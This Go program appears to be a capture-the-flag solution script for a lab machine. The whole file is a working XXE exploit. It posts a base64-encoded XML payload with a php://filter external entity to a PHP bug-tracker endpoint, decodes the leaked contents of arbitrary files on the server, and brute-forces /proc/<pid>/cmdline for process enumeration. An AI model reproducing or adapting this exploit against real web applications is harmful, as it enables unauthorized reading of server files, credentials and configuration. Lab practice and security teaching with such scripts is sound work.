package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"net/http"
	"net/url"

	"github.com/PuerkitoBio/goquery"
)

var (
	interactive = flag.Bool("i", false, "run interactive viewer")
)

func check(err error) {
	if err != nil {
		panic(err)
	}
}

func getFile(filename string) {
	payload := `<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE replace [
	<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=` + filename + `"> 
	]>
	<bugreport>
		<title>&xxe;</title>
	</bugreport>
		`
	b64_encoded := base64.StdEncoding.EncodeToString([]byte(payload))

	// post form
	resp, err := http.PostForm("http://10.10.11.100/tracker_diRbPr00f314.php",
		url.Values{"data": {b64_encoded}})
	check(err)
	defer resp.Body.Close()

	// parse xxe results
	doc, err := goquery.NewDocumentFromReader(resp.Body)
	check(err)
	doc.Find("tr:nth-of-type(1) td:nth-of-type(2)").Each(func(i int, s *goquery.Selection) {
		decoded, err := base64.StdEncoding.DecodeString(s.Text())
		check(err)

		// output file content
		decoded_str := string(decoded)
		if decoded_str != "" {
			fmt.Printf("[%v]\n", filename)
			fmt.Println(string(decoded_str))
		}

	})
}

func main() {
	flag.Parse()

	fmt.Println("File Downloader")
	fmt.Println("---------------------------------")

	if *interactive {
		for {
			fmt.Print("filename: ")
			var input string
			fmt.Scanln(&input)
			getFile(input)
		}
	} else {
		for i := 0; i < 99999; i++ {
			getFile(fmt.Sprintf("/proc/%d/cmdline", i))
		}
	}
}
